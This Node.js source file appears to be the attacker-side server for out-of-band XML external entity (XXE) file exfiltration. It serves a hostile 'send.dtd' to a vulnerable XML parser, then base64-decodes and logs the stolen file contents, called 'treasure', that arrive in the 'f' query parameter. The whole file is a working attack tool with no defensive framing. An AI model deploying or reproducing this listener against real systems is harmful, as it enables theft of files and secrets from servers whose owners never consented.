var http = require('http');
var url = require('url');
var fs = require('fs');

var is_base64 = true;
var listening_port = 8000;

http.createServer(function (req, res) {

	var path = url.parse(req.url, true).pathname;
	console.log("[" + new Date() + "] " + req.method + " - " + path);
	if (path.endsWith("send.dtd")) {
		fs.readFile("./send.dtd", function(error, content){
			res.writeHead(200, { 'Content-Type': 'application/octet-stream' });
			res.end(content, 'utf-8');
		});
	}	
	else {
		var queries = url.parse(req.url, true).query;
		if (queries != null && queries.f != null) {
			var treasure = queries.f;
			if (is_base64) {
				treasure = new Buffer(queries.f, 'base64').toString("ascii");
			}
			console.log("Payload " + queries.p + " returned\n" + treasure + "\n\n");
		}
		res.end();
	}

}).listen(listening_port);